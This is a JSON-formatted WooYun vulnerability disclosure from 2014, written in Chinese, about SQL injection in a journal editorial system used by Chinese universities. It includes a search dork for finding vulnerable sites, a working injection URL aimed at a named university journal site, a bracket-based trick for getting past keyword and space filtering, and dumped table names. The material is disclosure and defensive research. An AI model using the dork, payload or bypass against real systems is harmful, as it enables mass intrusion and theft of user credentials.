{"id": 42313, "wybug_id": "wooyun-2014-086140", "wybug_title": "某期刊采编系统注入漏洞以及绕过另附报错技巧", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "Damo", "wybug_date": "2014-12-08 19:11", "wybug_open_date": "2015-03-08 19:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-12：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-15：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-02-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-08：\t细节向公众公开  简要描述： 影响各大高校期刊该系统普遍为各高校使用清华大学**西安交通大学**哈尔滨工程大学学报**......等等 详细说明：  百度关键字：\ninurl:/oa/KeySearch.aspx?type=\n注入点：\n域名/oa/KeySearch.aspx?type=YinYong&Sel=201204001))And(1=(sElect(@@VERSION)))--\n这里以清华大学学报为例清华大学学报\nhttp://qhxb.lib.tsinghua.edu.cn/code>利用代码：<code>http://qhxb.lib.tsinghua.edu.cn/oa/KeySearch.aspx?type=YinYong&Sel=201204001))And(1=(sElect(@@VERSION)))--\n这里过滤了select，空格，等等等如何探测该系统过滤了哪些关键字那？这里我使用了 [] 中括号  ，其实用/*也可以但是*通常是被过滤的，所以这里采用了中括号有时候过滤空格的时候 我们可以这样：原来sql\nselect aaa,bbb,ccc from table\n变更后的：\nselect[aaa],[bbb],[ccc]from[table]\n看下图\n\n这里可以清楚的看到都过滤了哪些 我这里以\nuse exec create drop insert select delete update count alter truncate declare or and\n这些关键字为例，更多关键字可以自己添加,自己测试   漏洞证明：  百度关键字：\ninurl:/oa/KeySearch.aspx?type=\n注入点：\n域名/oa/KeySearch.aspx?type=YinYong&Sel=201204001))And(1=(sElect(@@VERSION)))--\n一下仅仅是一部分作为代表而已 清华大学学报\n\n燕山大学学报\n\n厦门大学学报\n\n中南林业科技大学\n\n等等 等等 数据库表名其中包括自定义函数名称   手工太费劲了 可否有加分项？ 啧啧View_SGFDict_InnerUnitView_Script_qfgjbtjDict_Judge_level'TimeConvertDict_Paper_FlagSumFieldTscriptnumdescDict_SequenceProductSumFoundRegister   13                 Password   UserNameTscriptnumdesc1SumAuthorTscriptnumdesc2Script_Operation_RecordSumExprotTscriptunitnumSumExprotTimeEditoractivityNum1EditoractivityNum2EmailQueueScriptNumEditoractivityNum3SolarDatayearEithortj1GetLunar_zhangzsyearEithortjf_num_str'yearEithortj2EquestPublishJobScript1AllFesttivalPublishUnitScript1Ad_ClassPublishAreaScript1OA_FieldsArticleItemsdt_generateansinameDict_Found'    42dt_adduserobjectdt_setpropertybyid'ColmunOrderdt_getobjwithpropUserRoledt_getpropertiesbyidEditor_Fieldsdt_setpropertybyid_udt_getobjwithprop_uInRoleUpdateColmunOrderEditor_Title'dt_getpropertiesbyid_uHitsdt_dropuserobjectbyidOA_EAd_DataList'dt_droppropertiesbyid'GenFunctionSQLOA'dt_verstamp006Dict_CorrectProcedureAd_Placedt_verstamp007UpdateOnlineCountdt_getpropertiesbyid_vcs'ScriptKeywordC''UpdatePageHits'Dict_Menudt_displayoaerror'ScriptUnitNewsItemsdt_adduserobject_vcsDict_Status'Ad_PlaceListdt_addtosourcecontrol'SelectPageHits'dt_checkinobjectPictureArticleReplyDict_FunctionScript_Issue_WithdrawMaxOnlinedt_checkoutobjectArticleViewPublishedScriptdt_isundersourcecontrolDict_Job_KindSetItemdt_removefromsourcecontrolV_OA_press_datedt_validateloginparamsScriptFields2MsgGroupdt_vcsenabledAutoSetpScriptFields3dt_whocheckedoutAhtorFileSelectMaxOnlinedt_getpropertiesbyid_vcs_uMsgSaveAuthorKeywordsGuestBookdt_displayoaerror_uAuthorKeywords1Announcementdt_addtosourcecontrol_uMsgToSendDict_MeetCheckdt_checkinobject_uSystemLog   113         LogContentDict_Proffesiondt_checkoutobject_uCanSendSumAuthorUnitdt_isundersourcecontrol_uCancelMsgDict_Province'Dict_ReportTempdt_validateloginparams_uInsertAutoMsgAdAd_UnitNameScript_AuthorEditor_EmailSetupAd_DataPublishAdminScriptdel_Users'ConfigUserList    174MessUser     175AuthorNum user    211   Disabled  Email_Real  EmailBox   Name  Unit  UserNameOA_CommentMemoAddUser   231syssegmentssysconstraintsMessageUser  242     EmailFormat   IsGroup   MessageID  NameAdminScript   修复方案：  过滤不严谨的话  还是参数化吧另外给建议吧 ：不要用那么多or  数据量大的话 会有压力的，具体怎么做去问问各位搭建社工库的大牛吧   版权声明：转载请注明来源 Damo@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-12-12 19:35 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-18 01:24 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  重复了。    \n     2015-01-18 09:07 |    \t\tDamo \t\t\t( 普通白帽子  |\t\t\t        Rank:209 漏洞数:31        | 我只是喜欢看加菲猫而已ส็็็็็็็็...)\t\t \n  @Mosuan 欧巴     你说的是这个吗 WooYun: 某大学在用系统一处sql注入漏洞     其实还和这个真不一样    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}